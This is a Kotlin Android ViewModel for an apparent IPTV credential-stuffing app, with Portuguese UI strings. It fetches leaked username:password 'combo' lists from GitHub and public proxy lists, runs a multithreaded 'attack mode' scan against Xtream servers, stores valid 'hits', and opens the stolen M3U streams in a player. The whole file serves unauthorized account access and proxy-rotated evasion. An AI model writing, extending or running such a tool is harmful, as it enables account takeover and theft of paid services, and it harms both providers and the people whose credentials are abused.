package com.ascan.ascanagent.ui

import android.app.Application
import android.content.Intent
import android.net.Uri
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateListOf
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.setValue
import androidx.lifecycle.AndroidViewModel
import androidx.lifecycle.viewModelScope
import com.ascan.ascanagent.data.AtkMode
import com.ascan.ascanagent.data.Credential
import com.ascan.ascanagent.data.Hit
import com.ascan.ascanagent.data.HitStorage
import com.ascan.ascanagent.data.ScanStats
import com.ascan.ascanagent.data.ScannerEngine
import com.ascan.ascanagent.data.ServerStatus
import com.ascan.ascanagent.data.XtreamApi
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

class ScanViewModel(app: Application) : AndroidViewModel(app) {

    private val engine = ScannerEngine()

    var server1 by mutableStateOf("")
    var server2 by mutableStateOf("")
    var server3 by mutableStateOf("")
    var server4 by mutableStateOf("")
    var server5 by mutableStateOf("")

    var threads by mutableStateOf("20")
    var mode by mutableStateOf(AtkMode.ADAPTATIVO)
    var comboName by mutableStateOf("")
    var comboCount by mutableStateOf(0)
    var comboItems: List<Credential> by mutableStateOf(emptyList())
    var comboList by mutableStateOf<List<Pair<String, String>>>(emptyList())
    var selectedCombo by mutableStateOf("")

    var proxyCount by mutableStateOf(0)
    private var proxies: List<String> = emptyList()

    var running by mutableStateOf(false)
    var paused by mutableStateOf(false)
    var stats by mutableStateOf(ScanStats())
    var ranking by mutableStateOf<List<ServerStatus>>(emptyList())
    var hits = mutableStateListOf<Hit>()
    var logs = mutableStateListOf<String>()
    var statusText by mutableStateOf("Pronto")
    var lastM3u by mutableStateOf("")
    var loadingCombo by mutableStateOf(false)

    init {
        engine.onStats = { s -> stats = s }
        engine.onHit = { h ->
            hits.add(0, h)
            if (hits.size > 200) hits.removeAt(hits.lastIndex)
            lastM3u = h.m3u
            HitStorage.save(getApplication(), h)
            log("[HIT] (${h.server}) ${h.user}:${h.pass}")
        }
        engine.onLog = { msg -> log(msg) }
        engine.onServerStatus = { ranking = it }
        engine.onFinished = {
            running = false
            paused = false
            statusText = "Parado"
        }
        refreshCombos()
    }

    fun log(msg: String) {
        logs.add(0, msg)
        if (logs.size > 80) logs.removeAt(logs.lastIndex)
    }

    fun refreshCombos() {
        viewModelScope.launch {
            loadingCombo = true
            val list = withContext(Dispatchers.IO) { XtreamApi.listGithubCombos() }
            comboList = list
            if (selectedCombo.isEmpty() && list.isNotEmpty()) {
                selectedCombo = list.first().first
            }
            loadingCombo = false
        }
    }

    fun loadSelectedCombo() {
        val item = comboList.find { it.first == selectedCombo } ?: return
        viewModelScope.launch {
            loadingCombo = true
            val text = withContext(Dispatchers.IO) { XtreamApi.fetchText(item.second) }
            if (text != null) {
                comboItems = XtreamApi.parseCombo(text)
                comboName = item.first
                comboCount = comboItems.size
                log("Combo: $comboName — $comboCount credenciais")
            } else {
                log("Falha ao baixar combo")
            }
            loadingCombo = false
        }
    }

    fun loadProxiesOnline() {
        viewModelScope.launch {
            log("Baixando proxies...")
            val urls = listOf(
                "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=5000&country=all",
                "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
                "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt"
            )
            val found = mutableListOf<String>()
            withContext(Dispatchers.IO) {
                for (u in urls) {
                    val t = XtreamApi.fetchText(u, 12) ?: continue
                    t.lineSequence().forEach { line ->
                        val p = line.trim()
                        if (p.isNotEmpty() && ':' in p && !p.startsWith("#") && ' ' !in p) {
                            found += if ("://" in p) p else "http://$p"
                        }
                    }
                    if (found.size >= 200) break
                }
            }
            proxies = found.distinct().take(400)
            proxyCount = proxies.size
            log(if (proxyCount > 0) "Proxies: $proxyCount" else "Nenhum proxy")
        }
    }

    fun clearProxies() {
        proxies = emptyList()
        proxyCount = 0
        log("Proxies limpos (direto)")
    }

    fun start() {
        val servers = listOf(server1, server2, server3, server4, server5)
            .map { it.trim() }
            .filter { it.isNotEmpty() }
            .map { XtreamApi.normServer(it) }
            .distinct()
        if (servers.isEmpty()) {
            log("Informe ao menos 1 servidor")
            return
        }
        if (comboItems.isEmpty()) {
            log("Carregue um combo antes")
            return
        }
        val thr = threads.toIntOrNull()?.coerceIn(1, 64) ?: 20
        running = true
        paused = false
        statusText = "Rodando"
        hits.clear()
        stats = ScanStats(totalCombo = comboItems.size, proxies = proxyCount)
        engine.start(servers, comboItems, comboName, thr, mode, proxies)
    }

    fun togglePause() {
        if (!running) return
        if (paused) {
            engine.resume()
            paused = false
            statusText = "Rodando"
        } else {
            engine.pause()
            paused = true
            statusText = "Pausado"
        }
    }

    fun stop() {
        engine.stop()
        running = false
        paused = false
        statusText = "Parado"
        log("Parado pelo usuario")
    }

    fun openPlayer() {
        val url = lastM3u
        if (url.isBlank()) {
            log("Nenhum hit para abrir no player")
            return
        }
        try {
            val intent = Intent(Intent.ACTION_VIEW).apply {
                setDataAndType(Uri.parse(url), "application/x-mpegURL")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            getApplication<Application>().startActivity(intent)
            log("Abrindo player...")
        } catch (_: Exception) {
            try {
                val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url)).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                getApplication<Application>().startActivity(intent)
            } catch (_: Exception) {
                log("Sem player compativel")
            }
        }
    }

    fun hitsPath(): String = HitStorage.hitsDir(getApplication()).absolutePath
}
